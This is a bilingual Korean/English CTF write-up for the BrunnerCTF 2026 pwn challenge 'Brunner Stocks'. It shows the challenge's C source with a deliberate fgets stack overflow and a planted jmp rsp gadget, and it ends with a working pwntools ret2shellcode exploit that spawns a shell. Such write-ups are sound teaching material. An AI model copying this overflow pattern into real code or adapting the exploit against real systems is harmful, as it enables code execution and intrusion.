---
title: "[BrunnerCTF 2026] Brunner Stocks"
subtitle: "Pwn / Brunner Stocks"
date: 2026-08-23 00:00:00 +0900
last_modified_at: 2026-08-24 05:08:29 +0900
category: ctf
group: ctf
langs: [ko, en]
tags: ["BrunnerCTF 2026", "pwn", "buffer overflow", "ret2shellcode", "jmp rsp"]
---
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-02-21-00.png)

---

<!--ko-->

## 보호 기법 확인

![]({{ site.baseurl }}/assets/img/posts/2026-08-23-04-32-43.png)
checksec으로 확인하면 Partial RELRO 외에는 어떤 보호 기법도 적용되어 있지 않다.

stocks 프로그램을 실행하면 다음과 같이 동작한다 (입력값은 임의):
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-29-45.png)

## 소스 코드 분석

```c
//stocks.c

#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

typedef struct {
    float income;
    float costs;
    float stock_price;
    float volatility;
    bool ai_company;
} Stock;

typedef bool (*Algorithm)(Stock e);

float askf(char *prompt) {
    printf("%s (0.0-100.0): ", prompt);
    char buf[0x10];
    fgets(buf, 0x100, stdin);
    return atof(buf);
}

bool askb(char *prompt) {
    printf("%s [Y/n]: ", prompt);
    char r = getchar();
    return r != 'n' && r != 'N';
}

float randf() {
    return (float)rand()/(float)RAND_MAX;
}

Stock create_stock() {
    Stock s;
    s.income = randf();
    s.costs = randf();
    s.stock_price = randf();
    s.volatility = randf();
    s.ai_company = randf() > 0.5;
    return s;
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    srand(time(NULL));

    float profit = askf("How important is profits to you?");
    float price = askf("How much do you value big stocks?");
    float risk = askf("How risk tolerant are you?");
    bool ai = askb("Do you want to be rich?");

    Algorithm algorithm;
    if (ai) {
        bool ai_alg(Stock s) {
            puts("AI alg");
            return s.ai_company;
        }
        algorithm = ai_alg;
    } else {
        bool real_alg(Stock s) {
            puts("Real alg");
            return ((s.income - s.costs)*profit + s.stock_price*price + s.volatility*risk) > 10;
        }
        algorithm = real_alg;
    }

    float made = 0;
    for (int i = 0; i < 10; i++) {
        Stock s = create_stock();
        bool bought = algorithm(s);

        float new_price = randf();
        if (bought) {
            made += new_price-s.stock_price;
        }
    }

    if (made > 0) {
        printf("Yaaay you made %f dkk and are rich now\n", made);
    } else {
        printf("You lost %f dkk sorry tough luck\n", made);
    }

    return 0;
}

void gadget() {
    __asm__(
        "jmp %rsp; ret;"
    );
}
```

---

## 취약점 분석

```c
float askf(char *prompt) {
    printf("%s (0.0-100.0): ", prompt);
    char buf[0x10];
    fgets(buf, 0x100, stdin);
    return atof(buf);
}
```

여기서 buf는 16바이트로 선언됐지만 fgets는 최대 256바이트까지 읽는다. 이 때문에 버퍼 오버플로우가 발생한다.

```c
void gadget() {
    __asm__(
        "jmp %rsp; ret;"
    );
}
```

gadget 함수 안의 `jmp rsp` 가젯은 ret2shellcode 공격을 가능하게 한다. NX가 걸려 있지 않기 때문이다.

---

## 익스플로잇 설계

`ret` 명령은 스택에서 값을 꺼내 그 주소로 점프한다. 리턴 주소를 `jmp rsp` 가젯 주소로 덮고 그 바로 뒤에 셸코드를 두면, 아래 흐름이 만들어진다.

페이로드 구성:
`[ 패딩 ] [ jmp rsp 주소 ] [ 셸코드 ]`

실행 흐름:

1. 함수 끝에서 `ret` 실행
2. 스택에서 `jmp rsp` 주소를 꺼냄 → rip에 저장
3. rsp += 8 → rsp가 셸코드를 가리킴
4. `jmp rsp` 실행 → 셸코드로 점프
5. 셸코드 실행 → 셸 획득

`[buffer: 16bytes] + [padding: ? bytes] + [jmp rsp 가젯 주소 (리턴 주소 자리)] + [Shellcode]`

패딩 크기를 모르므로 cyclic으로 구했다.
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-46-51.png)
결과가 24이므로 패딩은 8바이트임을 알 수 있다.

---

## 익스플로잇

BOF 오프셋을 알아냈으니, 이제 `jmp rsp` 가젯 주소만 찾으면 된다.
`objdump -d stocks | grep -A5 "gadget"`
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-49-54.png)
`jmp rsp 가젯 주소: 0x401597`

셸코드는 pwntools의 `shellcraft.sh()`로 어셈블리 텍스트를 만든 뒤 `asm()`으로 바이트코드로 변환했다.

최종 익스플로잇 코드는 다음과 같다:

```python
from pwn import *

context.arch = 'amd64'

p = process('./stocks')
#p = remote('address', port, ssl=True)
shellcode = asm(shellcraft.sh())

payload = b"A" * 16
payload += b"B" * 8
payload += p64(0x401597)
payload += shellcode

p.sendafter(b"(0.0-100.0): ", payload)

p.interactive()
```

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-54-43.png)

<!--en-->

## Check security techniques

![]({{ site.baseurl }}/assets/img/posts/2026-08-23-04-32-43.png)
Checksec reveals that no protection mechanisms are applied except for Partial RELRO.

The stocks program runs as follows when executed (input values are arbitrary):
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-29-45.png)

## Source Code Check

```c
//stocks.c

#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

typedef struct {
    float income;
    float costs;
    float stock_price;
    float volatility;
    bool ai_company;
} Stock;

typedef bool (*Algorithm)(Stock e);

float askf(char *prompt) {
    printf("%s (0.0-100.0): ", prompt);
    char buf[0x10];
    fgets(buf, 0x100, stdin);
    return atof(buf);
}

bool askb(char *prompt) {
    printf("%s [Y/n]: ", prompt);
    char r = getchar();
    return r != 'n' && r != 'N';
}

float randf() {
    return (float)rand()/(float)RAND_MAX;
}

Stock create_stock() {
    Stock s;
    s.income = randf();
    s.costs = randf();
    s.stock_price = randf();
    s.volatility = randf();
    s.ai_company = randf() > 0.5;
    return s;
}

int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    srand(time(NULL));

    float profit = askf("How important is profits to you?");
    float price = askf("How much do you value big stocks?");
    float risk = askf("How risk tolerant are you?");
    bool ai = askb("Do you want to be rich?");

    Algorithm algorithm;
    if (ai) {
        bool ai_alg(Stock s) {
            puts("AI alg");
            return s.ai_company;
        }
        algorithm = ai_alg;
    } else {
        bool real_alg(Stock s) {
            puts("Real alg");
            return ((s.income - s.costs)*profit + s.stock_price*price + s.volatility*risk) > 10;
        }
        algorithm = real_alg;
    }

    float made = 0;
    for (int i = 0; i < 10; i++) {
        Stock s = create_stock();
        bool bought = algorithm(s);

        float new_price = randf();
        if (bought) {
            made += new_price-s.stock_price;
        }
    }

    if (made > 0) {
        printf("Yaaay you made %f dkk and are rich now\n", made);
    } else {
        printf("You lost %f dkk sorry tough luck\n", made);
    }

    return 0;
}

void gadget() {
    __asm__(
        "jmp %rsp; ret;"
    );
}
```

---

## Discovered Vulnerabilities

```c
float askf(char *prompt) {
    printf("%s (0.0-100.0): ", prompt);
    char buf[0x10];
    fgets(buf, 0x100, stdin);
    return atof(buf);
}
```

Here, buf is declared as 16 bytes, but fgets reads up to 256 bytes. This causes a buffer overflow.

```c
void gadget() {
    __asm__(
        "jmp %rsp; ret;"
    );
}
```

The `jmp rsp` gadget inside the gadget function enables a ret2shellcode attack, since NX is not enabled.

---

## Exploit Plan

The `ret` instruction pops a value from the stack and jumps to it. By overwriting the return address with the address of the `jmp rsp` gadget and placing shellcode right after it, the following flow is achieved.

Payload layout:
`[ padding ] [ jmp rsp address ] [ shellcode ]`

Execution flow:

1. `ret` executes at the end of the function
2. Pops the `jmp rsp` address from the stack → stored in rip
3. rsp += 8 → rsp now points to the shellcode
4. `jmp rsp` executes → jumps to the shellcode
5. Shellcode runs → shell obtained

`[buffer: 16bytes] + [padding: ? bytes] + [jmp rsp gadget address (return address space)] + [Shellcode]`

Since the padding size is unknown, cyclic was used to determine it.
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-46-51.png)
The result of 24 indicates that the padding is 8 bytes.

---

## Exploit

Since the BOF offset is known, only the `jmp rsp` gadget address needs to be found.
`objdump -d stocks | grep -A5 "gadget"`
![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-49-54.png)
`jump rsp gadget address: 0x401597`

The shellcode was generated as assembly text using pwntools' `shellcraft.sh()`, then converted to bytecode using `asm()`.

The final exploit code is as follows:

```python
from pwn import *

context.arch = 'amd64'

p = process('./stocks')
#p = remote('address', port, ssl=True)
shellcode = asm(shellcraft.sh())

payload = b"A" * 16
payload += b"B" * 8
payload += p64(0x401597)
payload += shellcode

p.sendafter(b"(0.0-100.0): ", payload)

p.interactive()
```

![]({{ site.baseurl }}/assets/img/posts/2026-08-24-01-54-43.png)
